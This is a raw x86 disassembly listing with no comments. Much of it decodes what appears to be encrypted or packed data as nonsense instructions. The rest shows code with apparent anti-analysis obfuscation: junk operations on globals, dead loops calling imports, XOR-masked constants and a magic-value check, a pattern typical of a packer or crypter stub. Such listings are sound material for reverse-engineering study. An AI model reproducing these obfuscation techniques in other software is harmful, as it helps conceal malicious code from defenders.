  407fc3:	in     eax,dx
  407fc4:	mov    BYTE PTR [ebp-0x17],ch
  407fc7:	data16 cmc 
  407fc9:	dec    edi
  407fca:	pop    esi
  407fcb:	mov    ah,0xaf
  407fcd:	scas   al,BYTE PTR es:[edi]
  407fce:	out    dx,al
  407fcf:	cmp    BYTE PTR [edx-0x1dc1a0e4],ah
  407fd5:	inc    esi
  407fd6:	outs   dx,BYTE PTR cs:[esi]
  407fd8:	arpl   si,cx
  407fda:	mov    ebx,DWORD PTR [ebx-0x1cd367a]
  407fe0:	pop    ecx
  407fe1:	stc    
  407fe2:	adc    esi,DWORD PTR [edi+0x33]
  407fe5:	retf   0x3fa0
  407fe8:	mov    edx,0xbe24b892
  407fed:	out    dx,al
  407fee:	daa    
  407fef:	xor    dh,al
  407ff1:	repz mov esi,0x358fde97
  407ff7:	adc    esp,DWORD PTR [ecx-0x5f]
  407ffa:	(bad)  
  407ffb:	mov    bl,0x31
  407ffd:	leave  
  407ffe:	fsub   st,st(5)
  408000:	xchg   ecx,eax
  408001:	xchg   ebx,eax
  408002:	fild   WORD PTR [edi+0x33248461]
  408008:	dec    ebx
  408009:	sub    BYTE PTR [edi+0x10f44311],ch
  40800f:	data16 (bad) 
  408011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408012:	(bad)  
  408013:	loope  0x407f9c
  408015:	xchg   ecx,eax
  408016:	dec    edx
  408017:	out    dx,eax
  408018:	aad    0xc1
  40801a:	test   eax,0x29fee33b
  40801f:	xor    al,0x1
  408021:	xchg   BYTE PTR [eax-0x3e],bl
  408024:	sub    al,0xcb
  408026:	fwait
  408027:	xchg   esp,eax
  408028:	imul   esp,eax,0x720ab752
  40802e:	fldcw  WORD PTR [ecx-0x1972cf37]
  408034:	and    edx,DWORD PTR [edx-0x18]
  408037:	dec    ebp
  408038:	lods   eax,DWORD PTR ds:[esi]
  408039:	scas   eax,DWORD PTR es:[edi]
  40803a:	fnstsw WORD PTR [eax+eiz*4+0x73]
  40803e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40803f:	repz adc cl,BYTE PTR [esi]
  408042:	and    eax,0xfed7b48a
  408047:	aad    0x3c
  408049:	cs pop ebp
  40804b:	out    0xc2,eax
  40804d:	dec    ebp
  40804e:	mov    edx,0xdd0f5e52
  408053:	dec    edi
  408054:	pop    ss
  408055:	lock enter 0x248,0xb0
  40805a:	fisttp WORD PTR ds:0x9a857385
  408060:	push   edi
  408061:	pusha  
  408062:	mov    edx,0x1b0340a7
  408067:	stos   BYTE PTR es:[edi],al
  408068:	xor    BYTE PTR [esi-0x7f59f1e3],dh
  40806e:	retf   
  40806f:	ror    DWORD PTR [ebp-0x4],cl
  408072:	cmp    ch,cl
  408074:	jle    0x408036
  408076:	rcr    DWORD PTR [ebx+0xa],1
  408079:	cld    
  40807a:	xchg   esp,eax
  40807b:	fbld   TBYTE PTR [edx]
  40807d:	mov    bh,0xb8
  40807f:	mov    WORD PTR [esi-0x28],ss
  408082:	repz jb 0x4080f4
  408085:	cmp    ecx,DWORD PTR [ebx+0x128a3f88]
  40808b:	clc    
  40808c:	adc    BYTE PTR [ebp-0x61de2abc],al
  408092:	jge    0x408014
  408094:	dec    esp
  408095:	sub    al,0xf0
  408097:	push   esi
  408098:	mov    cl,0xc
  40809a:	pop    ebx
  40809b:	pop    edi
  40809c:	sbb    DWORD PTR [eax+ebx*8+0x18],ebp
  4080a0:	pop    esi
  4080a1:	bound  ebx,QWORD PTR [esi-0x1e]
  4080a4:	xchg   DWORD PTR [eax+0x50beda45],ebx
  4080aa:	jmp    0x4080df
  4080ac:	das    
  4080ad:	pop    ds
  4080ae:	fsub   st(4),st
  4080b0:	push   es
  4080b1:	inc    edx
  4080b2:	mov    ecx,0xb6ae84f5
  4080b7:	dec    eax
  4080b8:	mov    esp,?
  4080ba:	scas   eax,DWORD PTR es:[edi]
  4080bb:	(bad)  
  4080bc:	and    bl,ah
  4080be:	push   ecx
  4080bf:	cmp    al,0x7a
  4080c1:	test   al,0x2a
  4080c3:	pop    ss
  4080c4:	jae    0x408063
  4080c6:	mov    dh,dl
  4080c8:	sub    BYTE PTR [ecx-0x5a],ch
  4080cb:	xchg   ebp,eax
  4080cc:	aaa    
  4080cd:	out    dx,al
  4080ce:	fucom  st(5)
  4080d0:	lods   eax,DWORD PTR ds:[esi]
  4080d1:	xchg   ebp,eax
  4080d2:	repnz repz mov eax,ds:0xf4aa90ac
  4080d9:	xor    eax,0x7c8b8cd7
  4080de:	jae    0x4080f1
  4080e0:	push   0xe7f09ebd
  4080e5:	mov    ecx,0xed909127
  4080ea:	dec    edx
  4080eb:	inc    esp
  4080ec:	aad    0x3d
  4080ee:	push   es
  4080ef:	aam    0xe5
  4080f1:	imul   ecx,DWORD PTR [eax+0x34],0x36
  4080f5:	xor    dl,BYTE PTR [esi+esi*1+0x3d51583e]
  4080fc:	cmp    esi,ecx
  4080fe:	jg     0x4080a1
  408100:	mov    bh,0x76
  408102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408103:	cwde   
  408104:	mov    dh,0x8
  408106:	adc    BYTE PTR [ecx-0x29cae4d8],bh
  40810c:	retf   0x44d3
  40810f:	jmp    0x4cd3:0xb7c97dc5
  408116:	out    0x47,eax
  408118:	repz dec ecx
  40811a:	outs   dx,BYTE PTR ds:[esi]
  40811b:	pop    esp
  40811c:	and    al,BYTE PTR [ecx+0x4d]
  40811f:	inc    edx
  408120:	dec    esi
  408122:	out    dx,eax
  408123:	in     eax,0x5c
  408125:	stos   BYTE PTR es:[edi],al
  408126:	mov    al,ds:0x9851eda3
  40812b:	cmp    ebx,ebp
  40812d:	and    ecx,esi
  40812f:	das    
  408130:	fldcw  WORD PTR [ecx+0x36cbb06f]
  408136:	mul    BYTE PTR [ecx-0x5]
  408139:	mov    ecx,0x98365e9a
  40813e:	pop    es
  40813f:	cli    
  408140:	inc    ebp
  408141:	scas   al,BYTE PTR es:[edi]
  408142:	cld    
  408143:	out    0x64,eax
  408145:	int    0x3f
  408147:	sbb    BYTE PTR [ebx],0x8d
  40814a:	daa    
  40814b:	xor    DWORD PTR ds:0x23df,ebp
  408150:	and    bh,BYTE PTR [ecx-0x5f41272b]
  408156:	and    ah,BYTE PTR [esi+edi*1-0x4b68103b]
  40815d:	mov    ebx,0x827eeece
  408162:	mov    cl,0xd9
  408164:	fidivr WORD PTR [ecx+0x1ac8b2b0]
  40816a:	aam    0xe1
  40816c:	push   cs
  40816d:	sbb    al,0x1f
  40816f:	fst    QWORD PTR [esi]
  408171:	pop    ebx
  408172:	cli    
  408173:	xor    eax,0xa9949fe8
  408178:	daa    
  408179:	and    eax,DWORD PTR [ebx+0x24829e98]
  40817f:	fisttp QWORD PTR [eax+0x68f5b55f]
  408185:	jnp    0x408126
  408187:	xor    eax,0xbd728508
  40818c:	xchg   edi,eax
  40818d:	(bad)  
  40818f:	icebp  
  408190:	lock xchg ebp,eax
  408192:	xor    al,0x43
  408194:	fmul   DWORD PTR [eax]
  408196:	lock push es
  408198:	inc    ebx
  408199:	sahf   
  40819a:	out    dx,eax
  40819b:	outs   dx,BYTE PTR fs:[esi]
  40819d:	mov    al,ds:0x41941406
  4081a2:	cld    
  4081a3:	ins    BYTE PTR es:[edi],dx
  4081a4:	iret   
  4081a5:	jno    0x408133
  4081a7:	jnp    0x4081a3
  4081a9:	mov    bl,0x2d
  4081ab:	daa    
  4081ac:	xchg   ebx,eax
  4081ad:	jmp    0xb2d7d817
  4081b2:	cmp    dl,BYTE PTR [edx-0x60]
  4081b5:	cs mov bl,0xf1
  4081b8:	inc    eax
  4081b9:	mov    ch,0x4b
  4081bb:	adc    al,0x2f
  4081bd:	and    ebx,DWORD PTR [ebp-0x143f7035]
  4081c3:	xchg   edx,eax
  4081c4:	mov    al,0xfa
  4081c6:	push   0xa0c09d78
  4081cb:	push   0xc9dac376
  4081d0:	mov    edx,DWORD PTR ds:0x600112f2
  4081d6:	inc    ebp
  4081d7:	and    eax,0xe4638c4b
  4081dc:	mov    bl,BYTE PTR [edi*4-0x21780d0a]
  4081e3:	frstor [ecx-0xd]
  4081e6:	aam    0x94
  4081e8:	mov    cl,0xd6
  4081ea:	gs in  eax,dx
  4081ec:	and    BYTE PTR ds:0xf7623dee,bl
  4081f2:	push   ecx
  4081f3:	clc    
  4081f4:	sti    
  4081f5:	mov    edi,cs
  4081f7:	or     eax,ecx
  4081f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081fa:	or     eax,0xb8be372e
  4081ff:	jbe    0x408203
  408201:	int3   
  408202:	mov    dh,0x28
  408204:	loopne 0x4081a6
  408206:	xor    BYTE PTR [ebp+ebx*2+0xccd326d],dh
  40820d:	dec    esi
  40820e:	jbe    0x4081e8
  408210:	pusha  
  408211:	push   ebp
  408212:	shr    BYTE PTR [ecx+ecx*4-0x28f209ef],0x4f
  40821a:	push   ebp
  40821b:	push   eax
  40821c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40821d:	sub    edi,ecx
  40821f:	jbe    0x408202
  408221:	adc    bl,BYTE PTR [esi]
  408223:	cmc    
  408224:	cli    
  408225:	loop   0x4081b5
  408227:	enter  0x5d7c,0xe2
  40822b:	test   al,0x7d
  40822d:	add    eax,0x32acccec
  408232:	aad    0x0
  408234:	fwait
  408235:	xor    BYTE PTR [esi-0x46d9aa16],ah
  40823b:	(bad)  
  40823c:	(bad)  
  40823d:	frstor [ebx-0x6baa5878]
  408243:	or     BYTE PTR [edi+0x28],dh
  408246:	mov    ch,0x37
  408248:	xlat   BYTE PTR ds:[ebx]
  408249:	sbb    ebx,DWORD PTR [ebx+0x77e23b02]
  40824f:	add    ecx,DWORD PTR [ecx-0x7b03ee88]
  408255:	cdq    
  408256:	repnz adc edx,DWORD PTR [bx+si+0x73]
  40825b:	pop    eax
  40825c:	test   BYTE PTR [ebx+0x27],bl
  40825f:	js     0x40821c
  408261:	and    eax,0x3bf11ba2
  408266:	imul   ebp,DWORD PTR [ebp-0x4b],0xe1559e25
  40826d:	cli    
  40826e:	cmp    BYTE PTR [esi-0x55],bh
  408271:	or     DWORD PTR [edi+edx*4+0x141dcae1],esi
  408278:	xor    DWORD PTR [ebx-0x7761575c],edi
  40827e:	test   DWORD PTR [eax],ecx
  408280:	dec    esi
  408281:	cmc    
  408282:	(bad)  
  408283:	mov    ds:0x55611f57,al
  408288:	jmp    0xde2fa944
  40828d:	and    BYTE PTR [edi],al
  40828f:	jge    0x408273
  408291:	arpl   WORD PTR [ebp-0x4a596974],dx
  408297:	fadd   QWORD PTR [esi-0x72]
  40829a:	push   cs
  40829b:	ret    
  40829c:	std    
  40829d:	aam    0x37
  40829f:	dec    esi
  4082a0:	scas   al,BYTE PTR es:[edi]
  4082a1:	push   esi
  4082a2:	and    DWORD PTR [ebx-0x9],edi
  4082a5:	ja     0x4082a1
  4082a7:	and    ecx,edx
  4082a9:	fstp   st(2)
  4082ab:	inc    ebx
  4082ac:	and    DWORD PTR [ecx],eax
  4082ae:	cli    
  4082af:	or     BYTE PTR [edi-0x69],dh
  4082b2:	leave  
  4082b3:	out    dx,eax
  4082b4:	inc    ecx
  4082b5:	or     eax,0x1a96000
  4082ba:	xor    eax,0xa881c2e0
  4082bf:	nop
  4082c0:	jl     0x408282
  4082c2:	xor    edx,edi
  4082c4:	or     ebp,DWORD PTR [ebp+esi*4-0x50]
  4082c8:	cwde   
  4082c9:	test   al,0xc9
  4082cb:	scas   eax,DWORD PTR es:[edi]
  4082cc:	cli    
  4082cd:	add    DWORD PTR [ebp-0x11],esp
  4082d0:	inc    ebp
  4082d1:	iret   
  4082d2:	fs scas eax,DWORD PTR es:[edi]
  4082d4:	lahf   
  4082d5:	lods   al,BYTE PTR ds:[esi]
  4082d6:	ds ds fs cwde 
  4082da:	or     ebx,DWORD PTR [ebp+0x7a18b2c8]
  4082e0:	or     bl,cl
  4082e2:	cli    
  4082e3:	mov    eax,DWORD PTR [eax]
  4082e5:	pop    ecx
  4082e6:	aaa    
  4082e7:	ja     0x408278
  4082e9:	int3   
  4082ea:	pop    eax
  4082eb:	in     al,0x39
  4082ed:	fmul   DWORD PTR [eax+0x6b1a9bed]
  4082f3:	pop    edi
  4082f4:	push   eax
  4082f5:	gs ds into 
  4082f8:	xor    esi,DWORD PTR [ecx+0x29]
  4082fb:	cld    
  4082fc:	js     0x408297
  4082fe:	mov    esi,0xdccbba4b
  408303:	das    
  408304:	push   DWORD PTR [ecx]
  408306:	mov    dh,0xad
  408308:	les    esp,FWORD PTR [ebp-0x5c]
  40830b:	sub    dl,al
  40830d:	mov    ds:0x7bae5ee0,al
  408312:	pop    ebp
  408313:	sbb    ch,bh
  408315:	inc    ebp
  408316:	jl     0x4082e9
  408318:	gs xchg ebx,eax
  40831a:	fucomip st,st(2)
  40831c:	ins    DWORD PTR es:[edi],dx
  40831d:	test   ebp,edi
  40831f:	test   DWORD PTR [edi],ecx
  408321:	cmc    
  408322:	clc    
  408323:	stos   BYTE PTR es:[edi],al
  408324:	add    ecx,ecx
  408326:	fbstp  TBYTE PTR [esp+ecx*8+0x3967e81b]
  40832d:	jo     0x40836a
  40832f:	dec    esi
  408330:	xchg   ecx,eax
  408331:	jbe    0x40835f
  408333:	xchg   edx,eax
  408334:	in     eax,dx
  408335:	jae    0x408322
  408337:	xor    ch,BYTE PTR ds:0x9fd467d4
  40833d:	jl     0x4082c8
  40833f:	outs   dx,DWORD PTR ds:[esi]
  408340:	cld    
  408341:	mov    WORD PTR [ebp+0x15],cs
  408344:	addr16 mov al,ds:0xa3d6
  408348:	repnz shr BYTE PTR [esi+0x1b],0x24
  40834d:	pop    edi
  40834e:	mov    al,0xec
  408351:	pop    ecx
  408352:	fwait
  408353:	sar    eax,0x90
  408356:	ins    DWORD PTR es:[edi],dx
  408357:	mov    ebp,0x1334ba6
  40835c:	iret   
  40835d:	mov    ecx,0x378f1a34
  408362:	ss ins DWORD PTR es:[edi],dx
  408364:	js     0x4083e4
  408366:	adc    DWORD PTR [esi],edx
  408368:	jmp    0xe9f1:0x53a8a620
  40836f:	push   0x1b798ca1
  408374:	push   ecx
  408375:	sbb    al,0x2c
  408377:	mov    bh,0x83
  408379:	ins    DWORD PTR es:[edi],dx
  40837a:	hlt    
  40837b:	pop    ds
  40837c:	add    bh,BYTE PTR [ecx]
  40837e:	dec    edi
  40837f:	inc    ebp
  408380:	inc    ebx
  408381:	in     al,0xbf
  408383:	pop    esi
  408384:	xchg   ebp,eax
  408385:	sub    eax,DWORD PTR [ebx-0x9]
  408388:	add    esi,DWORD PTR [edi]
  40838a:	std    
  40838b:	std    
  40838c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40838d:	int3   
  40838e:	xchg   DWORD PTR [ebp+eiz*1-0x16],esi
  408392:	cld    
  408393:	push   ecx
  408394:	xchg   esi,eax
  408395:	jb     0x408400
  408397:	push   0x247a95ff
  40839c:	jno    0x4083c5
  40839e:	(bad)  
  40839f:	mov    esi,0xef873d05
  4083a4:	adc    BYTE PTR [eax+ecx*8-0x9],dl
  4083a8:	xchg   edi,eax
  4083a9:	lock or eax,0xf1f85a23
  4083af:	ins    BYTE PTR es:[edi],dx
  4083b0:	mov    fs,ecx
  4083b2:	ror    bh,cl
  4083b4:	sti    
  4083b5:	bound  esp,QWORD PTR [eax]
  4083b7:	ss push cs
  4083b9:	dec    esi
  4083ba:	inc    edx
  4083bb:	pusha  
  4083bc:	fld    TBYTE PTR [edi+0x3a]
  4083bf:	popf   
  4083c0:	ja     0x408423
  4083c2:	inc    ebp
  4083c3:	xor    bh,cl
  4083c5:	mov    BYTE PTR [ecx+ebx*4+0x52d7d00],0x4f
  4083cd:	int3   
  4083ce:	loope  0x408405
  4083d0:	sbb    al,0x5d
  4083d2:	sbb    dh,BYTE PTR [ebx]
  4083d4:	jnp    0x4083be
  4083d6:	mov    ds:0xbfed57a,al
  4083db:	add    dh,BYTE PTR [edx+edi*1-0x6327ac44]
  4083e2:	popf   
  4083e3:	(bad)  
  4083e4:	xor    DWORD PTR [esi+0x1b1a7417],eax
  4083ea:	outs   dx,BYTE PTR ds:[esi]
  4083eb:	icebp  
  4083ec:	mov    edx,0x9e5a76bf
  4083f1:	or     BYTE PTR [ecx-0x13f59270],0xe9
  4083f8:	mov    bh,0xf8
  4083fa:	not    edx
  4083fc:	xor    al,0x28
  4083fe:	hlt    
  4083ff:	mov    WORD PTR [ebp-0x3a],?
  408402:	das    
  408403:	aas    
  408404:	dec    DWORD PTR [esi]
  408406:	or     al,0xc2
  408408:	(bad)  
  408409:	fs pop ecx
  40840b:	jg     0x4083e1
  40840d:	inc    esp
  40840e:	fist   WORD PTR [esi]
  408410:	popa   
  408411:	adc    DWORD PTR [eax],ebx
  408413:	arpl   WORD PTR [esi-0x3a21ca2c],bp
  408419:	out    0xbf,eax
  40841b:	arpl   ax,dx
  40841d:	sti    
  40841e:	ds mov ecx,0xaa7d9f9c
  408424:	and    dl,BYTE PTR [edx]
  408426:	mov    ebx,0x66c34714
  40842b:	xchg   esi,eax
  40842c:	(bad)  
  40842e:	fmul   DWORD PTR [ebx-0x19]
  408431:	lds    edi,FWORD PTR [ebx+0x24ac8fd7]
  408437:	push   ebx
  408438:	push   edi
  408439:	adc    al,0xdf
  40843b:	jno    0x408452
  40843d:	sbb    eax,0x61f884c6
  408442:	in     al,dx
  408443:	mov    ch,0xaa
  408445:	fnstcw WORD PTR [ebp+0x50350ed1]
  40844b:	outs   dx,BYTE PTR ds:[esi]
  40844c:	dec    ebx
  40844d:	icebp  
  40844e:	(bad)  
  40844f:	and    bh,dh
  408451:	loopne 0x40845e
  408453:	fsub   DWORD PTR [esp+eiz*8]
  408456:	xor    eax,0xf50fcf5f
  40845b:	shl    edi,cl
  40845d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40845e:	arpl   WORD PTR [eax-0x9cb36e5],bp
  408464:	jnp    0x4084c5
  408466:	sahf   
  408467:	and    al,BYTE PTR [eax]
  408469:	mov    al,BYTE PTR [eax+edx*1]
  40846c:	mov    BYTE PTR [ebp-0x1],al
  40846f:	mov    eax,DWORD PTR [ebp-0x30]
  408472:	mov    edx,DWORD PTR [ebp-0xc]
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
